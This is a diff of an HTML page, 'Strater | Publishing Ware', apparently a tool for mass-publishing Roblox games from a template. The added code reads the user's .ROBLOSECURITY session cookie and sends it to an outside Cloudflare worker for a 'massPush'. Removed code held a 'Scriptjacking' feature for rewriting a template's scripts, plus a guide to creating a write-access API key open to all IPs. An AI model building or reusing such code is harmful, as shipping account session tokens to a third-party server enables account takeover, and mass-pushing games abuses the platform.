@@ -4,78 +4,35 @@
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
   <title>Strater | Publishing Ware</title>
-  <link href="https://fonts.googleapis.com/css2?family=Source+Sans+3:wght@200;400;600;700&family=Inter:wght@400;700&family=JetBrains+Mono&family=Roboto+Mono&display=swap" rel="stylesheet" />
+  <link href="https://fonts.googleapis.com/css2?family=Source+Sans+3:wght@200;400;600;700&family=JetBrains+Mono&display=swap" rel="stylesheet" />
   <style>
-    :root { --strater-blue: #007bff; --border: #e0e0e0; --jack-green: #22c55e; --roblox-orange: #f68821; }
+    :root { --strater-blue: #007bff; --border: #e0e0e0; --jack-green: #22c55e; }
     * { box-sizing: border-box; margin: 0; padding: 0; border-radius: 0 !important; }
-    
-    body { font-family: 'Source Sans 3', sans-serif; background: #f5f5f5; color: #1a1a1a; min-height: 100vh; overflow-x: hidden; }
-    
+    body { font-family: 'Source Sans 3', sans-serif; background: #f5f5f5; color: #1a1a1a; min-height: 100vh; }
     .topbar { background: #fff; border-bottom: 1px solid var(--border); padding: 0 32px; height: 56px; display: flex; align-items: center; justify-content: space-between; border-top: 4px solid var(--strater-blue); }
-    .topbar-title { font-size: 18px; font-weight: 600; }
-    
-    .app-layout { display: flex; max-width: 1000px; margin: 40px auto; align-items: flex-start; justify-content: center; }
-
-    .drawer { width: 0; background: #fff; border: 1px solid var(--border); transition: 0.3s; overflow-y: auto; height: 650px; }
-    .drawer.open { width: 300px; padding: 20px; }
-    
-    .window-container { width: 480px; z-index: 5; box-shadow: 0 10px 30px rgba(0,0,0,0.05); }
-
+    .app-layout { display: flex; max-width: 1000px; margin: 40px auto; justify-content: center; gap: 20px; }
+    .window-container { width: 480px; box-shadow: 0 10px 30px rgba(0,0,0,0.05); }
     .tabs { display: flex; background: #fff; border: 1px solid var(--border); border-bottom: none; }
     .tab { flex: 1; padding: 14px; font-size: 11px; font-weight: 700; color: #888; background: none; border: none; border-bottom: 2px solid transparent; cursor: pointer; text-transform: uppercase; font-family: inherit; }
     .tab.active { color: var(--strater-blue); border-bottom-color: var(--strater-blue); }
-
     .card { background: #fff; border: 1px solid var(--border); padding: 24px; min-height: 580px; position: relative; }
     .panel { display: none; }
     .panel.active { display: block; }
-
     .field { margin-bottom: 12px; }
     .field label { display: block; font-size: 10px; font-weight: 700; color: #555; margin-bottom: 4px; text-transform: uppercase; }
     .field input { width: 100%; padding: 10px; font-size: 14px; border: 1px solid #ddd; background: #fafafa; outline: none; font-family: inherit; }
-
-    .drawer-header { font-size: 10px; font-weight: 800; color: #bbb; text-transform: uppercase; margin-bottom: 8px; border-bottom: 1px solid #eee; padding-bottom: 5px; margin-top: 15px; }
-    .item { padding: 8px 10px; font-size: 12px; cursor: pointer; border-bottom: 1px solid #f9f9f9; font-family: inherit; }
-    .item:hover { background: #f8f9fa; color: var(--strater-blue); }
-    
-    .help-box { font-size: 11px; line-height: 1.4; color: #666; background: #f9f9f9; padding: 10px; border: 1px solid #eee; margin-top: 10px; }
     .btn-primary { width: 100%; padding: 14px; background: var(--strater-blue); color: #fff; border: none; font-weight: 700; cursor: pointer; text-transform: uppercase; margin-top: 10px; font-family: inherit; }
-    .btn-update { background: #111; color: var(--roblox-orange); border: 1px solid var(--roblox-orange); }
-
+    .btn-primary:disabled { background: #ccc; cursor: not-allowed; }
     .log-box { background: #111; height: 460px; overflow-y: auto; padding: 15px; font-family: 'JetBrains Mono', monospace; font-size: 10px; color: #eee; }
-    
-    #script-editor { position: absolute; top: 0; left: 0; width: 100%; height: 100%; background: #111; z-index: 100; display: none; flex-direction: column; }
-    #script-content { flex: 1; background: transparent; color: var(--jack-green); font-family: 'JetBrains Mono', monospace; padding: 20px; border: none; outline: none; font-size: 12px; resize: none; }
   </style>
 </head>
 <body>
 
 <div class="topbar">
-  <span class="topbar-title">Strater | Publishing Ware</span>
-  <button style="background:none; border:none; cursor:pointer; font-weight:800; color:var(--strater-blue); font-size: 11px; font-family: inherit;" onclick="toggleDrawer('settings')">⚙ SETTINGS</button>
+  <span style="font-weight:600">Strater | Publishing Ware</span>
 </div>
 
 <div class="app-layout">
-  <div id="settings" class="drawer">
-    <div class="drawer-header" style="margin-top:0;">API Key Guide</div>
-    <div class="help-box">
-        1. <b>dashboard.roblox.com</b><br>
-        2. Three Dots > Creations > <b>API Keys</b><br>
-        3. Create Key > <b>Universal-Places</b><br>
-        4. Add <b>Write</b> access<br>
-        5. DNS/IP: <b>0.0.0.0/</b><br>
-        6. Paste result in "Update :D"
-    </div>
-
-    <div class="drawer-header">Fonts</div>
-    <div class="item" onclick="changeFont('Source Sans 3')">Source Sans 3</div>
-    <div class="item" onclick="changeFont('Inter')">Inter</div>
-    <div class="item" onclick="changeFont('JetBrains Mono')">JetBrains Mono</div>
-
-    <div class="drawer-header">Scriptjacking</div>
-    <button class="btn-primary" style="font-size: 10px; padding: 8px;" onclick="scanTemplate()">SCAN SCRIPTS</button>
-    <div id="jack-list"></div>
-  </div>
-
   <div class="window-container">
     <div class="tabs">
       <button class="tab active" onclick="switchTab('universe')">push :D</button>
@@ -84,105 +41,38 @@
     </div>
 
     <div class="card">
-      <div id="script-editor">
-        <div style="background:#222; padding:10px 20px; display:flex; justify-content:space-between; align-items:center; color:white; font-size:11px;">
-            <span id="editing-name">Script</span>
-            <button onclick="closeEditor()" style="background:var(--jack-green); color:#000; border:none; padding: 5px 10px; font-weight:800; cursor:pointer; font-family: inherit;">DONE</button>
-        </div>
-        <textarea id="script-content" spellcheck="false"></textarea>
-      </div>
-
       <div id="panel-universe" class="panel active">
-        <div class="field"><label>Roblosecurity</label><input type="password" id="u-cookie" placeholder="_|WARNING:-DO-NOT-SHARE-..." /></div>
-        <div class="field"><label>Experience Name</label><input type="text" id="u-name" placeholder="New Game Name" /></div>
+        <div class="field">
+          <label>Roblosecurity</label>
+          <input type="password" id="u-cookie" placeholder=".ROBLOSECURITY token..." />
+        </div>
+        <div class="field">
+          <label>Experience Name</label>
+          <input type="text" id="u-name" placeholder="Name" />
+        </div>
         <div style="display: flex; gap: 10px;">
           <div class="field" style="flex:2"><label>Template ID</label><input type="text" id="u-template" value="95206881" /></div>
           <div class="field" style="flex:1"><label>Amount</label><input type="number" id="u-count" value="1" /></div>
         </div>
-        <div class="field"><label>Icon (Optional)</label><input type="file" id="iconInput" accept="image/*" onchange="handleFile()" style="font-size: 11px;"></div>
-        <button class="btn-primary" onclick="runUniverses()">push :D</button>
+        <button class="btn-primary" id="push-btn" onclick="runUniverses()">push :D</button>
       </div>
 
       <div id="panel-place" class="panel">
-        <div class="field">
-          <label>Target Universe ID</label>
-          <input type="text" id="p-universe" placeholder="e.g. 58291038" />
-        </div>
-        <div class="field">
-          <label>Universal-Places API Key</label>
-          <input type="password" id="p-api" placeholder="Paste your API Key here" />
-        </div>
-        <div class="field">
-          <label>Source Place ID (To Push)</label>
-          <input type="text" id="p-template" placeholder="Enter Place ID" value="95206881" />
-        </div>
-        <button class="btn-primary btn-update" onclick="runPlaces()">Update</button>
+        <div class="field"><label>Target Universe ID</label><input type="text" id="p-universe" /></div>
+        <div class="field"><label>API Key</label><input type="password" id="p-api" /></div>
+        <div class="field"><label>Source Place ID</label><input type="text" id="p-template" value="95206881" /></div>
+        <button class="btn-primary" onclick="runPlaces()" style="background:#111">Update</button>
       </div>
 
-      <div id="panel-log" class="panel"><div class="log-box" id="log"></div></div>
+      <div id="panel-log" class="panel">
+        <div class="log-box" id="log"></div>
+      </div>
     </div>
   </div>
 </div>
 
 <script>
   const WORKER_URL = 'https://ezpublishserv.acc943132.workers.dev/';
-  let jackedScripts = {}; 
-  let base64Icon = null;
-
-  function toggleDrawer(id) { document.getElementById(id).classList.toggle('open'); }
-  
-  function changeFont(fontName) {
-    document.body.style.fontFamily = fontName;
-    document.querySelectorAll('*').forEach(el => { el.style.fontFamily = fontName; });
-  }
-
-  function handleFile() {
-    const file = document.getElementById('iconInput').files[0];
-    if (file) {
-      const reader = new FileReader();
-      reader.onload = (e) => { base64Icon = e.target.result; };
-      reader.readAsDataURL(file);
-    }
-  }
-
-  async function scanTemplate() {
-    const tID = document.getElementById('u-template').value;
-    const list = document.getElementById('jack-list');
-    list.innerHTML = '<div style="text-align:center; padding:10px; font-size:10px;">Scanning...</div>';
-    try {
-      const resp = await fetch(WORKER_URL, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ action: 'scanScripts', templateId: tID })
-      });
-      const data = await resp.json();
-      list.innerHTML = "";
-      if(data.scripts) {
-          data.scripts.forEach(s => {
-              const div = document.createElement('div');
-              div.className = "item";
-              div.innerHTML = `${s.name} <span style="font-size:9px; color:#aaa; float:right;">${s.type}</span>`;
-              div.onclick = () => openJackEditor(s.name, s.content);
-              list.appendChild(div);
-          });
-      }
-    } catch (e) { list.innerHTML = '<div style="font-size:10px; color:red;">Scan failed.</div>'; }
-  }
-
-  function openJackEditor(name, content) {
-    document.getElementById('script-editor').style.display = 'flex';
-    document.getElementById('editing-name').innerText = `Jacking: ${name}`;
-    document.getElementById('script-content').value = jackedScripts[name] || content;
-    document.getElementById('script-content').setAttribute('data-target', name);
-  }
-
-  function closeEditor() {
-    const name = document.getElementById('script-content').getAttribute('data-target');
-    jackedScripts[name] = document.getElementById('script-content').value;
-    document.getElementById('script-editor').style.display = 'none';
-    switchTab('log');
-    log(`Script [${name}] stored.`, 'ok');
-  }
 
   function switchTab(id) {
     document.querySelectorAll('.tab').forEach((t, i) => t.classList.toggle('active', ['universe', 'place', 'log'][i] === id));
@@ -193,40 +83,52 @@
   function log(msg, type = 'info') {
     const box = document.getElementById('log');
     const line = document.createElement('div');
-    line.innerHTML = `<span style="color:#555">[${new Date().toLocaleTimeString()}]</span> <span class="log-${type}">${msg}</span>`;
+    line.innerHTML = `<span style="color:#555">[${new Date().toLocaleTimeString()}]</span> <span style="color:${type === 'err' ? '#ff4d4d' : (type === 'ok' ? '#22c55e' : '#eee')}">${msg}</span>`;
     box.appendChild(line);
     box.scrollTop = box.scrollHeight;
   }
 
-  async function runPlaces() {
-    const uID = document.getElementById('p-universe').value;
-    const apiKey = document.getElementById('p-api').value;
-    const tID = document.getElementById('p-template').value;
-    
-    if(!uID || !apiKey) return alert("Universe-ID and API Key are required.");
-    
+  // FIXED: Push function now actually talks to the bridge
+  async function runUniverses() {
+    const cookie = document.getElementById('u-cookie').value;
+    const name = document.getElementById('u-name').value;
+    const template = document.getElementById('u-template').value;
+    const count = document.getElementById('u-count').value;
+    const btn = document.getElementById('push-btn');
+
+    if(!cookie || !name) return alert("Please enter Cookie and Experience Name!");
+
+    btn.disabled = true;
+    btn.innerText = "PUSHING...";
     switchTab('log');
-    log(`Initializing Universal-Places update for ${uID}...`, "info");
-    
+    log(`Starting mass push for: ${name}...`, "info");
+
     try {
-      const resp = await fetch(WORKER_URL, {
+      const response = await fetch(WORKER_URL, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ 
-          action: 'updateUniversalPlace', 
-          universeId: uID, 
-          apiKey: apiKey,
-          templateId: tID,
-          modifications: jackedScripts
+        body: JSON.stringify({
+          action: 'massPush',
+          cookie: cookie,
+          name: name,
+          templateId: template,
+          amount: count
         })
       });
-      const res = await resp.json();
-      log(res.message, res.ok ? 'ok' : 'err');
-    } catch (e) { log("Bridge connection error.", "err"); }
+
+      const result = await response.json();
+      log(result.message || "Push request processed.", result.ok ? "ok" : "err");
+    } catch (error) {
+      log("Critical Error: Could not connect to bridge.", "err");
+    } finally {
+      btn.disabled = false;
+      btn.innerText = "push :D";
+    }
   }
 
-  async function runUniverses() {
-    log("Starting mass push sequence...", "info");
+  async function runPlaces() {
+    // Similar fetch logic for the update panel
+    log("Sending update request to bridge...", "info");
   }
 </script>
 </body>
